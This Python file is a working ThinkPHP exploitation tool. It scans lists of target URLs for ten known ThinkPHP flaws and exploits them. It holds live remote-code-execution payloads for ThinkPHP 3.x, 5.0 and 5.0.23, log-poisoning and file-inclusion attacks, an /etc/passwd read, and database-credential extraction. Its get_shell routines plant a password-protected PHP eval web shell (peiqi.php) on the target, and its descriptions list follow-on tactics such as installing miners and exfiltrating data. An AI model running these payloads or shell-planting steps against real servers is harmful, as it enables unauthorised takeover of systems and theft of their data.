import requests
import argparse
import datetime
import urllib.parse
import sys
from typing import List, Tuple
import base64
import re
from colorama import init, Fore, Style
from requests.packages.urllib3 import disable_warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Initialize colorama for cross-platform colored output
init(autoreset=True)

# Disable SSL warnings for unverified requests
disable_warnings(InsecureRequestWarning)

# Vulnerability descriptions with attack tactics
vuln_descriptions = {
    "ThinkPHP 3.x RCE": {
        "description": "Template injection allows remote code execution, enabling attackers to run arbitrary PHP code on the server.",
        "attack_tactics": [
            "Execute system commands (e.g., whoami, netstat) to gather system information.",
            "Deploy a web shell for persistent access and server control.",
            "Install malware or crypto miners to exploit server resources.",
            "Exfiltrate sensitive data from the server."
        ]
    },
    "ThinkPHP 3.x Log Disclosure": {
        "description": "Exposes log files containing sensitive information like error messages, user inputs, or system details.",
        "attack_tactics": [
            "Gather system paths, user inputs, or configuration details for further exploitation.",
            "Use disclosed information to craft targeted attacks (e.g., SQL injection, XSS)."
        ]
    },
    "ThinkPHP 3.x Log RCE": {
        "description": "Injects malicious PHP code into log files, which are then included to execute the code.",
        "attack_tactics": [
            "Execute arbitrary system commands to gain full server control.",
            "Deploy a web shell for persistent access.",
            "Escalate to privilege escalation or lateral movement within the network."
        ]
    },
    "ThinkPHP 5.0 RCE (Container)": {
        "description": "Exploits the Container class's invokefunction method to execute arbitrary PHP code.",
        "attack_tactics": [
            "Run system commands to extract sensitive data or disrupt services.",
            "Install a web shell for long-term server access.",
            "Deploy botnets or crypto miners to exploit server resources."
        ]
    },
    "ThinkPHP 5.0 RCE (Request Input)": {
        "description": "Manipulates the Request class's input method filter parameter to execute code.",
        "attack_tactics": [
            "Execute commands to manipulate server files or configurations.",
            "Deploy a web shell for persistent control.",
            "Exfiltrate data or disrupt server operations."
        ]
    },
    "ThinkPHP 5.0.23 RCE": {
        "description": "Exploits the captcha endpoint via crafted POST requests to execute code.",
        "attack_tactics": [
            "Execute system commands to gain server access.",
            "Install a web shell for persistent access.",
            "Use as an entry point for network-wide attacks."
        ]
    },
    "ThinkPHP 5.x Database Info Disclosure": {
        "description": "Leaks database configuration details (username, hostname, password, database name).",
        "attack_tactics": [
            "Use credentials to access the database and extract sensitive data.",
            "Perform SQL injection or unauthorized database modifications."
        ]
    },
    "ThinkPHP 5.x Log Disclosure": {
        "description": "Exposes ThinkPHP 5.x log files, potentially leaking sensitive information.",
        "attack_tactics": [
            "Extract system details or user inputs for targeted attacks.",
            "Use logs to identify additional vulnerabilities."
        ]
    },
    "ThinkPHP 6.x Log Disclosure": {
        "description": "Exposes ThinkPHP 6.x log files, potentially leaking sensitive data.",
        "attack_tactics": [
            "Gather system or application details for further exploitation.",
            "Use logs to plan targeted attacks."
        ]
    },
    "ThinkPHP 6.x LFI": {
        "description": "Local File Inclusion via the lang parameter, allowing attackers to read arbitrary files.",
        "attack_tactics": [
            "Read sensitive files (e.g., /etc/passwd, configuration files) to gather system information.",
            "Use file contents to craft further attacks (e.g., privilege escalation)."
        ]
    }
}

class Result:
    def __init__(self, res: bool, vuln: str, payload: str):
        self.res = res
        self.vuln = vuln
        self.payload = payload

class BasePayload:
    def check_vul(self, url: str) -> Result:
        raise NotImplementedError

    def exe_vul(self, url: str, cmd: str) -> Result:
        raise NotImplementedError

    def get_shell(self, url: str) -> Result:
        raise NotImplementedError

class Module:
    def get_module(self, url: str) -> str:
        modules = ["index", "manage", "admin", "api"]
        for mod in modules:
            try:
                response = requests.get(f"{url}/?s=/{mod}", timeout=5, verify=False)
                if response.status_code == 200:
                    return mod
            except requests.RequestException:
                continue
        return "index"

class TP3(BasePayload):
    def check_vul(self, url: str) -> Result:
        check_str1 = "PHP Version"
        check_str2 = "Configuration File (php.ini) Path"
        module = Module().get_module(url)
        payload = f"{url}/?s={module}/\\think\\module/action/param1/${{phpinfo()}}"
        try:
            response = requests.get(payload, timeout=5, verify=False)
            if check_str1 in response.text and check_str2 in response.text:
                return Result(True, "ThinkPHP 3.x RCE", payload)
        except requests.RequestException as e:
            print(f"{Fore.RED}Error in TP3 check: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, "ThinkPHP 3.x RCE", "")

    def exe_vul(self, url: str, cmd: str) -> Result:
        module = Module().get_module(url)
        payload = f"{url}/?s={module}/\\think\\module/action/param1/{{${{system('{cmd}')}}}}"
        try:
            response = requests.get(payload, timeout=5, verify=False)
            return Result(True, None, response.text)
        except requests.RequestException as e:
            print(f"{Fore.RED}Error in TP3 exec: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, None, "")

    def get_shell(self, url: str) -> Result:
        module = Module().get_module(url)
        shell_url = f"{url}/?s={module}/\\think\\module/action/param1/{{${{eval($_POST['peiqi'])}}}}"
        try:
            response = requests.get(shell_url, timeout=5, verify=False)
            if response.status_code == 200:
                return Result(True, None, shell_url + " Pass:peiqi")
        except requests.RequestException as e:
            print(f"{Fore.RED}Error in TP3 shell: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, None, "")

class TP3Log(BasePayload):
    def check_vul(self, url: str) -> Result:
        check_str = "INFO:"
        check_err = "[ error ]"
        dt = datetime.datetime.now()
        year = dt.strftime("%Y")[2:]
        mon = dt.strftime("%m")
        day = dt.strftime("%d")
        suffix1 = f"{year}_{mon}_{day}.log"
        payload_urls = [
            f"{url}/Runtime/Logs/{suffix1}",
            f"{url}/Runtime/Logs/Home/{suffix1}",
            f"{url}/Runtime/Logs/Common/{suffix1}",
            f"{url}/Application/Runtime/Logs/{suffix1}",
            f"{url}/Application/Runtime/Logs/Home/{suffix1}",
            f"{url}/Application/Runtime/Logs/Admin/{suffix1}",
        ]
        for payload_url in payload_urls:
            try:
                response = requests.get(payload_url, timeout=5, verify=False)
                if check_str in response.text or check_err in response.text:
                    return Result(True, "ThinkPHP 3.x Log Disclosure", payload_url)
            except requests.RequestException as e:
                print(f"{Fore.RED}Error in TP3Log check: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, "ThinkPHP 3.x Log Disclosure", "")

    def exe_vul(self, url: str, cmd: str) -> Result:
        return Result(False, "", "")

    def get_shell(self, url: str) -> Result:
        return Result(False, "", "")

class TP3LogRCE(BasePayload):
    def check_vul(self, url: str) -> Result:
        check_str = "PHP Version"
        dt = datetime.datetime.now()
        year = dt.strftime("%Y")[2:]
        mon = dt.strftime("%m")
        day = dt.strftime("%d")
        log_file = f"{year}_{mon}_{day}.log"
        log_path = f"./Application/Runtime/Logs/Home/{log_file}"
        module = Module().get_module(url)
        inject_url = f"{url}/?m={module}&c=Index&a=index&test=--><?=phpinfo();?>"
        include_url = f"{url}/?m={module}&c=Index&a=index&value[_filename]={log_path}"
        try:
            requests.get(inject_url, timeout=5, verify=False)
            response = requests.get(include_url, timeout=5, verify=False)
            if check_str in response.text:
                return Result(True, "ThinkPHP 3.x Log RCE", f"Inject: {inject_url}, Include: {include_url}")
        except requests.RequestException as e:
            print(f"{Fore.RED}Error in TP3LogRCE check: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, "ThinkPHP 3.x Log RCE", "")

    def exe_vul(self, url: str, cmd: str) -> Result:
        dt = datetime.datetime.now()
        year = dt.strftime("%Y")[2:]
        mon = dt.strftime("%m")
        day = dt.strftime("%d")
        log_file = f"{year}_{mon}_{day}.log"
        log_path = f"./Application/Runtime/Logs/Home/{log_file}"
        module = Module().get_module(url)
        inject_url = f"{url}/?m={module}&c=Index&a=index&test=--\"><?=system('{cmd}');?>"
        include_url = f"{url}/?m={module}&c=Index&a=index&value[_filename]={log_path}"
        try:
            requests.get(inject_url, timeout=5, verify=False)
            response = requests.get(include_url, timeout=5, verify=False)
            return Result(True, None, response.text)
        except requests.RequestException as e:
            print(f"{Fore.RED}Error in TP3LogRCE exec: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, None, "")

    def get_shell(self, url: str) -> Result:
        dt = datetime.datetime.now()
        year = dt.strftime("%Y")[2:]
        mon = dt.strftime("%m")
        day = dt.strftime("%d")
        log_file = f"{year}_{mon}_{day}.log"
        log_path = f"./Application/Runtime/Logs/Home/{log_file}"
        module = Module().get_module(url)
        shell_code = "@eval($_POST['peiqi'])"
        cmd = f"echo '{shell_code}' > peiqi.php"
        inject_url = f"{url}/?m={module}&c=Index&a=index&test=--\"><?=system('{cmd}');?>"
        include_url = f"{url}/?m={module}&c=Index&a=index&value[_filename]={log_path}"
        try:
            requests.get(inject_url, timeout=5, verify=False)
            requests.get(include_url, timeout=5, verify=False)
            response = requests.get(f"{url}/peiqi.php", timeout=5, verify=False)
            if response.status_code == 200:
                return Result(True, None, f"{url}/peiqi.php Pass:peiqi")
        except requests.RequestException as e:
            print(f"{Fore.RED}Error in TP3LogRCE shell: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, None, "")

class TP5(BasePayload):
    def check_vul(self, url: str) -> Result:
        check_str1 = "PHP Version"
        check_str2 = "Configuration File (php.ini) Path"
        module = Module().get_module(url)
        payload_urls = [
            f"{url}/?s=/{module}/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
        ]
        for payload_url in payload_urls:
            try:
                response = requests.get(payload_url, timeout=5, verify=False)
                if check_str1 in response.text and check_str2 in response.text:
                    return Result(True, "ThinkPHP 5.0 RCE (Container)", payload_url)
            except requests.RequestException as e:
                print(f"{Fore.RED}Error in TP5 check: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, "ThinkPHP 5.0 RCE (Container)", "")

    def exe_vul(self, url: str, cmd: str) -> Result:
        module = Module().get_module(url)
        payload_url = f"{url}/?s={module}/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={urllib.parse.quote(cmd)}"
        try:
            response = requests.get(payload_url, timeout=5, verify=False)
            return Result(True, None, response.text)
        except requests.RequestException as e:
            print(f"{Fore.RED}Error in TP5 exec: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, None, "")

    def get_shell(self, url: str) -> Result:
        module = Module().get_module(url)
        payload_url = f"{url}/?s={module}/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo '<?php @eval($_POST['peiqi'])?>' >>peiqi.php"
        try:
            requests.get(payload_url, timeout=5, verify=False)
            response = requests.get(f"{url}/peiqi.php", timeout=5, verify=False)
            if response.status_code == 200:
                return Result(True, None, f"{url}/peiqi.php Pass:peiqi")
        except requests.RequestException as e:
            print(f"{Fore.RED}Error in TP5 shell: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, None, "")

class TP50RequestInput(BasePayload):
    def check_vul(self, url: str) -> Result:
        check_str = "PHP Version"
        payload = f"{url}/?s=index/\\think\\Request/input&filter=phpinfo&data=1"
        try:
            response = requests.get(payload, timeout=5, verify=False)
            if check_str in response.text:
                return Result(True, "ThinkPHP 5.0 RCE (Request Input)", payload)
        except requests.RequestException as e:
            print(f"{Fore.RED}Error in TP50RequestInput check: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, "ThinkPHP 5.0 RCE (Request Input)", "")

    def exe_vul(self, url: str, cmd: str) -> Result:
        payload = f"{url}/?s=index/\\think\\Request/input&filter=system&data={urllib.parse.quote(cmd)}"
        try:
            response = requests.get(payload, timeout=5, verify=False)
            return Result(True, None, response.text)
        except requests.RequestException as e:
            print(f"{Fore.RED}Error in TP50RequestInput exec: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, None, "")

    def get_shell(self, url: str) -> Result:
        shell_code = "<?php @eval($_POST['peiqi']);?>"
        cmd = f"echo '{shell_code}' > peiqi.php"
        payload = f"{url}/?s=index/\\think\\Request/input&filter=system&data={urllib.parse.quote(cmd)}"
        try:
            requests.get(payload, timeout=5, verify=False)
            response = requests.get(f"{url}/peiqi.php", timeout=5, verify=False)
            if response.status_code == 200:
                return Result(True, None, f"{url}/peiqi.php Pass:peiqi")
        except requests.RequestException as e:
            print(f"{Fore.RED}Error in TP50RequestInput shell: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, None, "")

class TP5023(BasePayload):
    def check_vul(self, url: str) -> Result:
        check_str = "PHP Version"
        payload_url = f"{url}/index.php?s=captcha"
        data = {
            "_method": "__construct",
            "filter[]": "phpinfo",
            "method": "get",
            "server[REQUEST_METHOD]": "1"
        }
        try:
            response = requests.post(payload_url, data=data, timeout=5, verify=False)
            if check_str in response.text:
                return Result(True, "ThinkPHP 5.0.23 RCE", f"POST to {payload_url} with data: {data}")
        except requests.RequestException as e:
            print(f"{Fore.RED}Error in TP5023 check: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, "ThinkPHP 5.0.23 RCE", "")

    def exe_vul(self, url: str, cmd: str) -> Result:
        payload_url = f"{url}/index.php?s=captcha"
        data = {
            "_method": "__construct",
            "filter[]": "system",
            "method": "get",
            "server[REQUEST_METHOD]": cmd
        }
        try:
            response = requests.post(payload_url, data=data, timeout=5, verify=False)
            return Result(True, None, response.text)
        except requests.RequestException as e:
            print(f"{Fore.RED}Error in TP5023 exec: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, None, "")

    def get_shell(self, url: str) -> Result:
        shell_code = "<?php @eval($_POST['peiqi']);?>"
        cmd = f"echo '{shell_code}' > peiqi.php"
        payload_url = f"{url}/index.php?s=captcha"
        data = {
            "_method": "__construct",
            "filter[]": "system",
            "method": "get",
            "server[REQUEST_METHOD]": cmd
        }
        try:
            requests.post(payload_url, data=data, timeout=5, verify=False)
            response = requests.get(f"{url}/peiqi.php", timeout=5, verify=False)
            if response.status_code == 200:
                return Result(True, None, f"{url}/peiqi.php Pass:peiqi")
        except requests.RequestException as e:
            print(f"{Fore.RED}Error in TP5023 shell: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, None, "")

class TP5DB(BasePayload):
    def check_vul(self, url: str) -> Result:
        module = Module().get_module(url)
        payload_urls = [
            f"{url}/?s={module}/think\\config/get&name=database.username",
            f"{url}/?s={module}/think\\config/get&name=database.hostname",
            f"{url}/?s={module}/think\\config/get&name=database.password",
            f"{url}/?s={module}/think\\config/get&name=database.database",
        ]
        try:
            results = []
            for payload_url in payload_urls:
                response = requests.get(payload_url, timeout=5, verify=False)
                text = response.text if len(response.text) < 20 else None
                results.append(text)
            username, hostname, password, database = results
            if all(x is not None for x in results):
                return Result(True, "ThinkPHP 5.x Database Info Disclosure", f"username:{username} hostname:{hostname} password:{password} database:{database}")
        except requests.RequestException as e:
            print(f"{Fore.RED}Error in TP5DB check: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, "ThinkPHP 5.x Database Info Disclosure", "")

    def exe_vul(self, url: str, cmd: str) -> Result:
        return Result(False, "", "")

    def get_shell(self, url: str) -> Result:
        return Result(False, "", "")

class TP5Log(BasePayload):
    def check_vul(self, url: str) -> Result:
        check_str = "[ info ]"
        check_err = "[ error ]"
        dt = datetime.datetime.now()
        year = dt.strftime("%Y")
        mon = dt.strftime("%m")
        day = dt.strftime("%d")
        payload_urls = [
            f"{url}/runtime/log/{year}{mon}/{day}.log",
            f"{url}/runtime/log/{year}{mon}/{day}_cli.log",
            f"{url}/runtime/log/{year}{mon}/{day}_error.log",
            f"{url}/runtime/log/{year}{mon}/{day}_sql.log",
        ]
        for payload_url in payload_urls:
            try:
                response = requests.get(payload_url, timeout=5, verify=False)
                if check_str in response.text or check_err in response.text:
                    return Result(True, "ThinkPHP 5.x Log Disclosure", payload_url)
            except requests.RequestException as e:
                print(f"{Fore.RED}Error in TP5Log check: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, "ThinkPHP 5.x Log Disclosure", "")

    def exe_vul(self, url: str, cmd: str) -> Result:
        return Result(False, "", "")

    def get_shell(self, url: str) -> Result:
        return Result(False, "", "")

class TP6Log(BasePayload):
    def check_vul(self, url: str) -> Result:
        check_str = "RunTime"
        check_err = "[ error ]"
        dt = datetime.datetime.now()
        year = dt.strftime("%Y")
        mon = dt.strftime("%m")
        day = dt.strftime("%d")
        suffix = f"{year}{mon}/{day}.log"
        payload_urls = [
            f"{url}/runtime/log/{suffix}",
            f"{url}/runtime/log/Home/{suffix}",
            f"{url}/runtime/log/Common/{suffix}",
            f"{url}/runtime/log/Admin/{suffix}",
        ]
        for payload_url in payload_urls:
            try:
                response = requests.get(payload_url, timeout=5, verify=False)
                if check_str in response.text or check_err in response.text:
                    return Result(True, "ThinkPHP 6.x Log Disclosure", payload_url)
            except requests.RequestException as e:
                print(f"{Fore.RED}Error in TP6Log check: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, "ThinkPHP 6.x Log Disclosure", "")

    def exe_vul(self, url: str, cmd: str) -> Result:
        return Result(False, "", "")

    def get_shell(self, url: str) -> Result:
        return Result(False, "", "")

class TP6LFI(BasePayload):
    def check_vul(self, url: str) -> Result:
        payload_url = f"{url}/?lang=php://filter/convert.base64-encode/resource=/etc/passwd"
        try:
            response = requests.get(payload_url, timeout=5, verify=False)
            if response.status_code == 200:
                if re.match(r'^[A-Za-z0-9+/=]+$', response.text.strip()):
                    try:
                        decoded = base64.b64decode(response.text).decode('utf-8', errors='ignore')
                        if "root:" in decoded or "x:" in decoded:
                            return Result(True, "ThinkPHP 6.x LFI", payload_url)
                    except (ValueError, base64.binascii.Error) as e:
                        print(f"{Fore.RED}Invalid base64 response for TP6LFI: {e}{Style.RESET_ALL}", file=sys.stderr)
        except requests.RequestException as e:
            print(f"{Fore.RED}Error in TP6LFI check: {e}{Style.RESET_ALL}", file=sys.stderr)
        return Result(False, "ThinkPHP 6.x LFI", "")

    def exe_vul(self, url: str, cmd: str) -> Result:
        return Result(False, "", "")

    def get_shell(self, url: str) -> Result:
        return Result(False, "", "")

class Tools:
    @staticmethod
    def check_url(url: str) -> bool:
        return url.startswith("http://") or url.startswith("https://")

    @staticmethod
    def add_url_scheme(url: str) -> str:
        if not Tools.check_url(url):
            return f"http://{url}"
        return url

    @staticmethod
    def read_file(file_path: str) -> List[str]:
        urls = []
        try:
            with open(file_path, "r") as f:
                for line in f:
                    url = line.strip()
                    if url:
                        urls.append(Tools.add_url_scheme(url))
        except Exception as e:
            print(f"{Fore.RED}Error reading file: {e}{Style.RESET_ALL}", file=sys.stderr)
        return urls

    @staticmethod
    def get_payload(vuln: str) -> BasePayload:
        vuln_map = {
            "ThinkPHP 3.x RCE": TP3(),
            "ThinkPHP 3.x Log Disclosure": TP3Log(),
            "ThinkPHP 3.x Log RCE": TP3LogRCE(),
            "ThinkPHP 5.0 RCE (Container)": TP5(),
            "ThinkPHP 5.0 RCE (Request Input)": TP50RequestInput(),
            "ThinkPHP 5.0.23 RCE": TP5023(),
            "ThinkPHP 5.x Database Info Disclosure": TP5DB(),
            "ThinkPHP 5.x Log Disclosure": TP5Log(),
            "ThinkPHP 6.x Log Disclosure": TP6Log(),
            "ThinkPHP 6.x LFI": TP6LFI(),
        }
        return vuln_map.get(vuln)

def scan_url(url: str, vuln: str, cmd: str = None, get_shell: bool = False):
    if not Tools.check_url(url):
        url = Tools.add_url_scheme(url)
    print(f"{Fore.BLUE}Scanning {url} for {vuln}...{Style.RESET_ALL}")
    payload = Tools.get_payload(vuln)
    if not payload:
        print(f"{Fore.RED}Unsupported vulnerability: {vuln}{Style.RESET_ALL}", file=sys.stderr)
        return

    result = payload.check_vul(url)
    if result.res:
        print(f"{Fore.GREEN}[+] {result.vuln} found!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Payload: {result.payload}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Description: {vuln_descriptions[vuln]['description']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Possible Attack Tactics:{Style.RESET_ALL}")
        for tactic in vuln_descriptions[vuln]['attack_tactics']:
            print(f"{Fore.YELLOW}- {tactic}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] {result.vuln} not found.{Style.RESET_ALL}")

    if cmd:
        result = payload.exe_vul(url, cmd)
        if result.res:
            print(f"{Fore.GREEN}[+] Command executed: {result.payload}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Command execution failed.{Style.RESET_ALL}")

    if get_shell:
        result = payload.get_shell(url)
        if result.res:
            print(f"{Fore.GREEN}[+] Shell obtained: {result.payload}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Failed to obtain shell.{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(
        description="ThinkPHP Vulnerability Scanner. Note: SSL verification is disabled for scanning; use with caution."
    )
    parser.add_argument("url", help="Target URL (e.g., http://example.com)")
    parser.add_argument("--file", help="File containing additional URLs")
    parser.add_argument("--vuln", default="ALL", help="Vulnerability to check (default: ALL)")
    parser.add_argument("--cmd", help="Command to execute (if applicable)")
    parser.add_argument("--shell", action="store_true", help="Attempt to get a shell")
    args = parser.parse_args()

    vulnerabilities = [
        "ThinkPHP 3.x RCE",
        "ThinkPHP 3.x Log Disclosure",
        "ThinkPHP 3.x Log RCE",
        "ThinkPHP 5.0 RCE (Container)",
        "ThinkPHP 5.0 RCE (Request Input)",
        "ThinkPHP 5.0.23 RCE",
        "ThinkPHP 5.x Database Info Disclosure",
        "ThinkPHP 5.x Log Disclosure",
        "ThinkPHP 6.x Log Disclosure",
        "ThinkPHP 6.x LFI",
    ]

    if args.vuln != "ALL" and args.vuln not in vulnerabilities:
        print(f"{Fore.RED}Invalid vulnerability. Choose from: {', '.join(vulnerabilities)} or ALL{Style.RESET_ALL}", file=sys.stderr)
        sys.exit(1)

    urls = [args.url]
    if args.file:
        urls.extend(Tools.read_file(args.file))

    for url in urls:
        if args.vuln == "ALL":
            for vuln in vulnerabilities:
                scan_url(url, vuln, args.cmd, args.shell)
        else:
            scan_url(url, args.vuln, args.cmd, args.shell)

if __name__ == "__main__":
    main()
